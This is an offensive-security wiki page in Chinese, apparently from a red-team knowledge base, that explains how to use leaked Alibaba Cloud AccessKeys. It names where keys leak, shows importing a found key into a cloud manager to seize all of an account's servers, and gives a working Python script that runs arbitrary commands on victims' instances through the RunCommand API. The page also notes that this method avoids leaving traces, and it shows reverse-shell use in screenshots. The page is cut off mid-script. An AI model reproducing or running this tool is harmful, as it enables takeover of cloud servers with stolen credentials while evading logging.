
<!DOCTYPE HTML>
<html lang="zh-hans" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>云服务器 Access 密钥泄露 · PeiQi WiKi-RED文库</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        <meta name="author" content="PeiQi">
        
        
    
    <link rel="stylesheet" href="../../../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-splitter/splitter.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-alerts/style.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-code/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-accordion/accordion.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-search-pro/search.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-emphasize/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-flexible-alerts/style.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-pageview-count/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-theme-comscore/test.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="../../../社会工程/README.md" />
    
    
    <link rel="prev" href="../" />
    

    
    
    
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="输入并搜索" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../../../">
            
                <a href="../../../../">
            
                    
                    关于文库
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../../../../TIME.html">
            
                <a href="../../../../TIME.html">
            
                    
                    更新时间线记录
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../../../信息收集/">
            
                <a href="../../../信息收集/">
            
                    
                    信息收集
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" data-path="../../../信息收集/">
            
                <a href="../../../信息收集/">
            
                    
                    搜索引擎
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1.1" data-path="../../../信息收集/搜索引擎/推荐工具/">
            
                <a href="../../../信息收集/搜索引擎/推荐工具/">
            
                    
                    推荐工具
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1.1.1" data-path="../../../信息收集/搜索引擎/推荐工具/GitDocker/GitDocker.html">
            
                <a href="../../../信息收集/搜索引擎/推荐工具/GitDocker/GitDocker.html">
            
                    
                    GitDocker
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.1.1.2" data-path="../../../信息收集/搜索引擎/Google/Google.html">
            
                <a href="../../../信息收集/搜索引擎/Google/Google.html">
            
                    
                    Google
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.3" data-path="../../../信息收集/搜索引擎/网络测绘/网络测绘.html">
            
                <a href="../../../信息收集/搜索引擎/网络测绘/网络测绘.html">
            
                    
                    网络测绘
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2" data-path="../../">
            
                <a href="../../">
            
                    
                    漏洞挖掘
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.1" data-path="../">
            
                <a href="../">
            
                    
                    API密钥泄露
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter active" data-level="2.2.1.1" data-path="云服务器 Access 密钥泄露.html">
            
                <a href="云服务器 Access 密钥泄露.html">
            
                    
                    云服务器 Access 密钥泄露
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.3" data-path="../../../社会工程/README.md">
            
                <span>
            
                    
                    社会工程
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4" data-path="../../../防御规避/">
            
                <a href="../../../防御规避/">
            
                    
                    防御规避
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.1" data-path="../../../防御规避/Webshell免杀/">
            
                <a href="../../../防御规避/Webshell免杀/">
            
                    
                    Webshell免杀
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.1.1" data-path="../../../防御规避/Webshell免杀/推荐工具/">
            
                <a href="../../../防御规避/Webshell免杀/推荐工具/">
            
                    
                    推荐工具
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.1.1.1" data-path="../../../防御规避/Webshell免杀/推荐工具/Webshell免杀/Webshell免杀.html">
            
                <a href="../../../防御规避/Webshell免杀/推荐工具/Webshell免杀/Webshell免杀.html">
            
                    
                    Webshell@pureqh
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.5" data-path="../../../权限提升/README.md">
            
                <span>
            
                    
                    权限提升
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.6" data-path="../../../内网信息/README.md">
            
                <span>
            
                    
                    内网信息
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.7" data-path="../../../持久控制/README.md">
            
                <span>
            
                    
                    持久控制
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.8" data-path="../../../横向移动/README.md">
            
                <span>
            
                    
                    横向移动
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            本书使用 GitBook 发布
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../../../.." >云服务器 Access 密钥泄露</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="&#x4E91;&#x670D;&#x52A1;&#x5668;-accesskey-&#x5BC6;&#x94A5;&#x6CC4;&#x9732;">&#x4E91;&#x670D;&#x52A1;&#x5668; AccessKey &#x5BC6;&#x94A5;&#x6CC4;&#x9732;</h1>
<p>&#x76EE;&#x524D;&#x4E3A;&#x6B62;&#xFF0C;&#x4E91;&#x670D;&#x52A1;&#x5668;&#x5DF2;&#x7ECF;&#x5360;&#x636E;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x7684;&#x5927;&#x90E8;&#x5206;&#x5E02;&#x573A;&#xFF0C;&#x7531;&#x4E8E;&#x4E91;&#x670D;&#x52A1;&#x5668;&#x6613;&#x7BA1;&#x7406;&#xFF0C;&#x64CD;&#x4F5C;&#x6027;&#x5F3A;&#xFF0C;&#x5B89;&#x5168;&#x7A0B;&#x5EA6;&#x9AD8;&#x3002;&#x5F88;&#x591A;&#x5927;&#x578B;&#x5382;&#x5546;&#x90FD;&#x9009;&#x62E9;&#x5C06;&#x8D44;&#x4EA7;&#x90E8;&#x7F72;&#x5728;&#x4E91;&#x670D;&#x52A1;&#x4E0A;&#xFF0C;&#x4F46;&#x5B89;&#x5168;&#x7684;&#x540C;&#x65F6;&#x7531;&#x4E8E;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x7684;&#x758F;&#x5FFD;&#x4E5F;&#x4F1A;&#x5BFC;&#x81F4;&#x4E00;&#x4E9B;&#x975E;&#x9884;&#x671F;&#x7684;&#x7A81;&#x7834;&#x53E3;</p>
<p>&#x5728;&#x9605;&#x8BFB;&#x4E0B;&#x6587;&#x524D;&#x6211;&#x4EEC;&#x5148;&#x7B80;&#x5355;&#x4E86;&#x89E3;&#x4E0B;&#x5173;&#x4E8E;<strong>&#x4E91;&#x670D;&#x52A1;&#x7684; AccessKey&#x5BC6;&#x94A5;</strong>&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x62FF; <strong>&#x963F;&#x91CC;&#x4E91;</strong> &#x4E3E;&#x4E00;&#x4E2A;&#x4F8B;&#x5B50;</p>
<p><a href="image/yunzhuji-1.png" data-lightbox="b1e0e5e6-2645-4d3b-852c-0dbb2c116fdf" data-title=""><img src="image/yunzhuji-1.png" alt=""></a></p>
<p>&#x767B;&#x5F55;&#x963F;&#x91CC;&#x4E91;&#x8D26;&#x6237;&#x540E;&#x70B9;&#x51FB; <strong>AccessKey&#x7BA1;&#x7406;</strong></p>
<p><a href="image/yunzhuji-2.png" data-lightbox="72f88260-f737-4aef-87bf-f5b2671a5173" data-title=""><img src="image/yunzhuji-2.png" alt=""></a></p>
<p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#x8FD9;&#x4E2A;&#x5BC6;&#x94A5;&#x76F8;&#x5F53;&#x4E8E;&#x8D26;&#x6237;&#x7684;API&#x8C03;&#x7528;&#xFF0C;&#x5177;&#x6709;&#x8D26;&#x6237;&#x5B8C;&#x5168;&#x7684;&#x6743;&#x9650;</p>
<p><a href="image/yunzhuji-3.png" data-lightbox="dd7331d9-ebdd-40aa-9bc2-3838d96dea83" data-title=""><img src="image/yunzhuji-3.png" alt=""></a></p>
<p>&#x521B;&#x5EFA;&#x540E;&#x5C31;&#x4F1A;&#x751F;&#x6210; <strong>AccessKey ID&#xFF0C;AccessKey Secret</strong></p>
<blockquote>
<p>[!NOTE]</p>
<ul>
<li>AccessKeyId&#xFF1A;&#x7528;&#x4E8E;&#x6807;&#x8BC6;&#x7528;&#x6237;&#x3002;</li>
<li>AccessKeySecret&#xFF1A;&#x7528;&#x4E8E;&#x9A8C;&#x8BC1;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x94A5;&#x3002;AccessKeySecret&#x5FC5;&#x987B;&#x4FDD;&#x5BC6;&#x3002;</li>
</ul>
</blockquote>
<p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x5C31;&#x521B;&#x5EFA;&#x597D;&#x4E86;&#x8FD9;&#x4E2A;&#x5BC6;&#x94A5;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x5F00;&#x53D1;&#x8FC7;&#x7A0B;&#x4E2D;&#x5C31;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x9700;&#x8981;&#x8FD9;&#x4E2A;&#x5BC6;&#x94A5;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;&#x5BC6;&#x94A5;&#x6211;&#x4EEC;&#x901A;&#x5E38;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x4FE1;&#x606F;&#x6536;&#x96C6;&#x624B;&#x6BB5;&#x62FF;&#x5230;&#x8FD9;&#x4E2A;&#x5BC6;&#x94A5;</p>
<blockquote>
<p>[!NOTE]</p>
<p>FOFA&#xFF0C;Google&#x7B49;&#x641C;&#x7D22;&#x5F15;&#x64CE;</p>
</blockquote>
<p><a href="image/yunzhuji-5.png" data-lightbox="ea44f1ef-113e-4fca-9831-905f6e15d472" data-title=""><img src="image/yunzhuji-5.png" alt=""></a></p>
<p><a href="image/yunzhuji-4.png" data-lightbox="1bb2bffc-3fd3-45a7-824f-41b1df5ed75a" data-title=""><img src="image/yunzhuji-4.png" alt=""></a></p>
<blockquote>
<p>[!NOTE]</p>
<p>Github</p>
</blockquote>
<p><a href="image/yunzhuji-6.png" data-lightbox="37757b48-ad2f-4919-a5b1-b16397448d80" data-title=""><img src="image/yunzhuji-6.png" alt=""></a></p>
<blockquote>
<p>[!NOTE]</p>
<p>&#x90E8;&#x5206;&#x5F00;&#x53D1;&#x6846;&#x67B6;&#x7684;Debug&#x6216;&#x62A5;&#x9519;&#x9875;&#x9762;</p>
</blockquote>
<p><a href="image/yunzhuji-7.png" data-lightbox="e3e7a1e9-4c9f-4f07-a0eb-384f9ab69839" data-title=""><img src="image/yunzhuji-7.png" alt=""></a></p>
<p><a href="image/yunzhuji-13.png" data-lightbox="955dec68-2149-4be6-b57b-776bc96aa56b" data-title=""><img src="image/yunzhuji-13.png" alt=""></a></p>
<p>&#x5728;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x8FC7;&#x7A0B;&#x4E2D;&#x62FF;&#x5230;&#x8FD9;&#x4E2A;&#x5BC6;&#x94A5;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x5230;&#x4E91;&#x670D;&#x52A1;&#x7BA1;&#x7406;&#x5E73;&#x53F0;&#x83B7;&#x53D6;&#x66F4;&#x591A;&#x4FE1;&#x606F;</p>
<p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x884C;&#x4E91;&#x7BA1;&#x5BB6;&#x8FDB;&#x884C;&#x4E0B;&#x4E00;&#x6B65;: <a href="https://yun.cloudbility.com/" target="_blank">https://yun.cloudbility.com/</a></p>
<p>&#x767B;&#x5F55;&#x6CE8;&#x518C;&#x540E;&#x9009;&#x62E9;&#x5BF9;&#x5E94;&#x7684;&#x5382;&#x5546;&#x670D;&#x52A1;&#x5E76;&#x5199;&#x5165;&#x5BC6;&#x94A5;</p>
<p><a href="image/yunzhuji-8.png" data-lightbox="9a1479ac-75d7-423c-b705-b8b284f2aca7" data-title=""><img src="image/yunzhuji-8.png" alt=""></a></p>
<p><a href="image/yunzhuji-9.png" data-lightbox="7aa7e4de-efc2-440f-8fa7-4294962ef8a2" data-title=""><img src="image/yunzhuji-9.png" alt=""></a></p>
<p>&#x63A5;&#x7740;&#x4F1A;&#x626B;&#x63CF;&#x8D26;&#x6237;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x52FE;&#x9009;&#x6DFB;&#x52A0;&#x70B9;&#x51FB;&#x4E0B;&#x4E00;&#x6B65;</p>
<p><a href="image/yunzhuji-10.png" data-lightbox="2cd2cc2a-c797-48cb-a40b-06d28e3fb796" data-title=""><img src="image/yunzhuji-10.png" alt=""></a></p>
<p>&#x8FD9;&#x6837;&#x5C31;&#x4F1A;&#x8D26;&#x6237;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x4E3B;&#x673A;&#x6DFB;&#x52A0;&#x8FDB;&#x53BB;</p>
<p><a href="image/yunzhuji-11.png" data-lightbox="6456d054-9976-4dde-b240-442fbd787a0d" data-title=""><img src="image/yunzhuji-11.png" alt=""></a></p>
<p>&#x5982;&#x4E0B;&#x56FE;&#xFF0C;&#x5DF2;&#x7ECF;&#x62E5;&#x6709;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7BA1;&#x7406;&#x6743;&#x9650;&#xFF0C;&#x91CD;&#x542F;&#xFF0C;&#x5173;&#x95ED;&#xFF0C;&#x6539;&#x5BC6;&#x7801;&#x90FD;&#x662F;&#x975E;&#x5E38;&#x5371;&#x9669;&#x7684;&#x884C;&#x4E3A;</p>
<p><a href="image/yunzhuji-12.png" data-lightbox="7046dfe6-2d47-43e7-a1ab-c3682aa56721" data-title=""><img src="image/yunzhuji-12.png" alt=""></a></p>
<p>&#x800C;&#x6211;&#x4EEC;&#x8981;&#x505A;&#x5230;&#x7684;&#x662F;&#x63A7;&#x5236;&#x4E3B;&#x673A;&#xFF0C;&#x7528;&#x5176;&#x4ED6;&#x7684;&#x5E73;&#x53F0;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x662F;&#x884C;&#x4E0D;&#x901A;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8C03;&#x7528;&#x539F;&#x751F;&#x7684;API&#x6765;&#x5BF9;&#x4E3B;&#x673A;&#x8FDB;&#x884C;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<p>&#x963F;&#x91CC;&#x4E91;API&#x5F00;&#x53D1;&#x94FE;&#x63A5;: <a href="https://next.api.aliyun.com/api/Ecs/2014-05-26/RunInstances" target="_blank">https://next.api.aliyun.com/api/Ecs/2014-05-26/RunInstances</a></p>
<blockquote>
<p>[!NOTE]</p>
<p>pip3 install aliyun-python-sdk-core</p>
<p>pip3 install aliyun-python-sdk-ecs</p>
</blockquote>
<p><a href="image/yunzhuji-14.png" data-lightbox="64b9a2a3-e221-4a79-b92a-2af7645c8da0" data-title=""><img src="image/yunzhuji-14.png" alt=""></a></p>
<p>&#x963F;&#x91CC;&#x4E91;&#x7684; API &#x4E2D;&#x62E5;&#x6709;&#x4E86;&#x6240;&#x6709;&#x6B64;&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x901A;&#x8FC7;&#x8C03;&#x7528;API&#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x6E17;&#x900F;&#x8FC7;&#x7A0B;&#x4E2D;&#x5B8C;&#x6210;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x5BF9;&#x4E3B;&#x673A;&#x7684;&#x64CD;&#x4F5C;</p>
<p>&#x7B80;&#x5355;&#x5217;&#x4E3E;&#x4E0B;API&#x8C03;&#x7528;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x7136;&#x540E;&#x5199;API&#x5229;&#x7528;&#x811A;&#x672C;</p>
<p><a href="image/yunzhuji-15.png" data-lightbox="16c9ba03-5adb-4824-aa91-5cc463a4d4d2" data-title=""><img src="image/yunzhuji-15.png" alt=""></a></p>
<p>&#x9996;&#x5148;&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x7528;&#x6237;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x4E3B;&#x673A;&#x4FE1;&#x606F;</p>
<p>&#x8C03;&#x7528;API  <strong>DescribeInstances</strong></p>
<p><a href="image/yunzhuji-16.png" data-lightbox="f2a038ed-3226-47aa-b00f-b27aaec27575" data-title=""><img src="image/yunzhuji-16.png" alt=""></a></p>
<p>&#x521B;&#x5EFA;&#x4E00;&#x6761;&#x9700;&#x8981;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;</p>
<blockquote>
<p>[!NOTE]</p>
<p>&#x8FD9;&#x91CC;&#x6211;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x65E7;&#x7248;&#x7684;API RunCommand</p>
<p>&#x56E0;&#x4E3A;&#x4E00;&#x6B21;&#x6027;&#x8FD4;&#x56DE; CommandId InvokeId &#x4E14;&#x4F7F;&#x7528;&#x5B8C;&#x5C31;&#x5220;&#x9664;&#xFF0C;&#x4E0D;&#x4F1A;&#x4FDD;&#x7559;&#x5728;&#x4E91;&#x52A9;&#x624B;</p>
</blockquote>
<p><a href="image/yunzhuji-17.png" data-lightbox="fd260a5f-2b67-49df-94d5-e4b356497656" data-title=""><img src="image/yunzhuji-17.png" alt=""></a></p>
<p>&#x518D;&#x5B8C;&#x6210;&#x56DE;&#x663E;&#x7684;&#x67E5;&#x770B;&#x7684;API&#x8C03;&#x7528;  <strong>DescribeInvocationResults</strong> </p>
<p><a href="image/yunzhuji-18.png" data-lightbox="a917e077-e149-4a5b-8d23-e2b5a82593cc" data-title=""><img src="image/yunzhuji-18.png" alt=""></a></p>
<p>&#x66F4;&#x591A;&#x7684;&#x529F;&#x80FD;&#x5927;&#x5BB6;&#x5C31;&#x81EA;&#x884C;&#x63A2;&#x7D22;&#x5566;</p>
<p>&#x8FD9;&#x91CC;&#x770B;&#x4E00;&#x4E0B;&#x6211;&#x5199;&#x7684;&#x5229;&#x7528;&#x4EE3;&#x7801;&#x7684;&#x4F7F;&#x7528;</p>
<blockquote>
<p>[!NOTE]</p>
<p>&#x626B;&#x63CF;&#x5730;&#x57DF;&#x4E3B;&#x673A;</p>
</blockquote>
<p><a href="image/yunzhuji-19.png" data-lightbox="d0c54109-874d-4408-9291-0fb2d079bc46" data-title=""><img src="image/yunzhuji-19.png" alt=""></a></p>
<blockquote>
<p>[!NOTE]</p>
<p>Linux&#x4E3B;&#x673A;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
</blockquote>
<p><a href="image/yunzhuji-20.png" data-lightbox="916b2158-14bf-49e9-a025-61c5200fbb03" data-title=""><img src="image/yunzhuji-20.png" alt=""></a></p>
<blockquote>
<p>[!NOTE]</p>
<p>Windows&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
</blockquote>
<p><a href="image/yunzhuji-21.png" data-lightbox="21e9a0d5-4193-4052-aaf9-322d940c3d1f" data-title=""><img src="image/yunzhuji-21.png" alt=""></a></p>
<blockquote>
<p>[!NOTE]</p>
<p>&#x53CD;&#x5F39;shell</p>
</blockquote>
<p><a href="image/yunzhuji-23.png" data-lightbox="349dbc4d-b5f7-4118-8348-02c59ab71526" data-title=""><img src="image/yunzhuji-23.png" alt=""></a></p>
<blockquote>
<p>[!NOTE]</p>
<p>&#x5B8C;&#x6574;&#x4EE3;&#x7801;&#x548C;&#x6240;&#x9700;Python&#x5E93; </p>
<p>pip3 install aliyun-python-sdk-core</p>
<p>pip3 install aliyun-python-sdk-ecs</p>
</blockquote>
<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment">#coding=utf-8</span>

<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">from</span> aliyunsdkcore.client <span class="hljs-keyword">import</span> AcsClient
<span class="hljs-keyword">from</span> aliyunsdkcore.acs_exception.exceptions <span class="hljs-keyword">import</span> ClientException
<span class="hljs-keyword">from</span> aliyunsdkcore.acs_exception.exceptions <span class="hljs-keyword">import</span> ServerException
<span class="hljs-keyword">from</span> aliyunsdkecs.request.v20140526.DescribeInstanceStatusRequest <span class="hljs-keyword">import</span> DescribeInstanceStatusRequest
<span class="hljs-keyword">from</span> aliyunsdkecs.request.v20140526.DescribeRegionsRequest <span class="hljs-keyword">import</span> DescribeRegionsRequest
<span class="hljs-keyword">from</span> aliyunsdkecs.request.v20140526.DescribeInstancesRequest <span class="hljs-keyword">import</span> DescribeInstancesRequest
<span class="hljs-keyword">from</span> aliyunsdkecs.request.v20140526.DescribeInvocationResultsRequest <span class="hljs-keyword">import</span> DescribeInvocationResultsRequest
<span class="hljs-keyword">from</span> aliyunsdkecs.request.v20140526.RunCommandRequest <span class="hljs-keyword">import</span> RunCommandRequest

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Linux_Cmd_Exec</span><span class="hljs-params">(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, ZhuJi_ID, Zhuji_Aliyun_City_Host)</span>:</span>
    client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Zhuji_Aliyun_City_Host)
    request = DescribeInstancesRequest()
    request.set_accept_format(<span class="hljs-string">&apos;json&apos;</span>)
    InstanceId = [ZhuJi_ID]
    request.set_InstanceIds(InstanceId)

    response = client.do_action_with_exception(request)
    response = str(response, encoding=<span class="hljs-string">&apos;utf-8&apos;</span>)
    print(
    <span class="hljs-string">&quot;&quot;&quot;
    \033[1;31m --------------------------------------------------------------------------------\033[0m
    \033[1;31m -        +-------+                                                             \033[0m
    \033[1;31m -        | Linux |                OS: %s                                       \033[0m
    \033[1;31m -        |       |     --------&gt;  IP: %s                                       \033[0m
    \033[1;31m -        |       |                Name: %s                                     \033[0m
    \033[1;31m -        +-------+                                                             \033[0m
    \033[1;31m --------------------------------------------------------------------------------\033[0m
    &quot;&quot;&quot;</span> % (
        json.loads(response)[<span class="hljs-string">&apos;Instances&apos;</span>][<span class="hljs-string">&apos;Instance&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&apos;OSName&apos;</span>],
        json.loads(response)[<span class="hljs-string">&apos;Instances&apos;</span>][<span class="hljs-string">&apos;Instance&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&apos;PublicIpAddress&apos;</span>][<span class="hljs-string">&apos;IpAddress&apos;</span>][<span class="hljs-number">0</span>],
        json.loads(response)[<span class="hljs-string">&apos;Instances&apos;</span>][<span class="hljs-string">&apos;Instance&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&apos;InstanceName&apos;</span>])
    )
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        Cmd = str(input(<span class="hljs-string">&quot;\033[5;37m[root@{}] \033[0m&quot;</span>.format(ZhuJi_ID)))
        <span class="hljs-keyword">if</span> Cmd == <span class="hljs-string">&quot;exit&quot;</span>:
            print(<span class="hljs-string">&quot;\033[1;31m-&#x6B63;&#x5728;&#x9000;&#x51FA;&#x4E3B;&#x673A;..... {} \033[0m&quot;</span>.format(ZhuJi_ID))
            <span class="hljs-keyword">break</span>
        Linux_exec(client, Cmd, ZhuJi_ID)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Linux_exec</span><span class="hljs-params">(client, Cmd, ZHUJI_ID)</span>:</span>
    request = RunCommandRequest()
    request.set_accept_format(<span class="hljs-string">&apos;json&apos;</span>)

    request.set_Type(<span class="hljs-string">&quot;RunShellScript&quot;</span>)
    request.set_CommandContent(Cmd)
    request.set_InstanceIds([ZHUJI_ID])
    request.set_Name(<span class="hljs-string">&quot;PeiQi&quot;</span>)
    request.set_Description(<span class="hljs-string">&quot;PeiQi&quot;</span>)
    request.set_Timed(<span class="hljs-keyword">False</span>)

    response = client.do_action_with_exception(request)
    response = str(response, encoding=<span class="hljs-string">&apos;utf-8&apos;</span>)
    CommandId = json.loads(response)[<span class="hljs-string">&apos;CommandId&apos;</span>]
    InvokeId  = json.loads(response)[<span class="hljs-string">&apos;InvokeId&apos;</span>]
    <span class="hljs-comment">#print(CommandId, InvokeId)</span>
    time.sleep(<span class="hljs-number">1</span>)
    request = DescribeInvocationResultsRequest()
    request.set_accept_format(<span class="hljs-string">&apos;json&apos;</span>)

    request.set_InvokeId(InvokeId)
    request.set_InstanceId(ZHUJI_ID)
    request.set_CommandId(CommandId)
    request.set_ContentEncoding(<span class="hljs-string">&quot;PlainText&quot;</span>)

    response = client.do_action_with_exception(request)
    response = str(response, encoding=<span class="hljs-string">&apos;utf-8&apos;</span>)
    Output = json.loads(response)[<span class="hljs-string">&apos;Invocation&apos;</span>][<span class="hljs-string">&apos;InvocationResults&apos;</span>][<span class="hljs-string">&apos;InvocationResult&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;Output&quot;</span>]
    print(<span class="hljs-string">&quot;\033[1;32m{}\033[0m&quot;</span>.format(Output))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Windows_Cmd_Exec</span><span class="hljs-params">(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, ZhuJi_ID, Zhuji_Aliyun_City_Host)</span>:</span>
    client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Zhuji_Aliyun_City_Host)
    request = DescribeInstancesRequest()
    request.set_accept_format(<span class="hljs-string">&apos;json&apos;</span>)
    InstanceId = [ZhuJi_ID]
    request.set_InstanceIds(InstanceId)

    response = client.do_action_with_exception(request)
    response = str(response, encoding=<span class="hljs-string">&apos;utf-8&apos;</span>)
    print(
    <span class="hljs-string">&quot;&quot;&quot;
    \033[1;31m --------------------------------------------------------------------------------\033[0m
    \033[1;31m -        +-------+                                                             \033[0m
    \033[1;31m -        |Windows|               OS: %s                                       \033[0m
    \033[1;31m -        +-------+    --------&gt;  IP: %s                                       \033[0m
    \033[1;31m -       /_______/                Name: %s                                     \033[0m
    \033[1;31m -                                                                              \033[0m
    \033[1;31m --------------------------------------------------------------------------------\033[0m
    &quot;&quot;&quot;</span> % (
            json.loads(response)[<span class="hljs-string">&apos;Instances&apos;</span>][<span class="hljs-string">&apos;Instance&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&apos;OSName&apos;</span>],
            json.loads(response)[<span class="hljs-string">&apos;Instances&apos;</span>][<span class="hljs-string">&apos;Instance&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&apos;PublicIpAddress&apos;</span>][<span class="hljs-string">&apos;IpAddress&apos;</span>][<span class="hljs-number">0</span>],
            json.loads(response)[<span class="hljs-string">&apos;Instances&apos;</span>][<span class="hljs-string">&apos;Instance&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&apos;InstanceName&apos;</span>])
    )
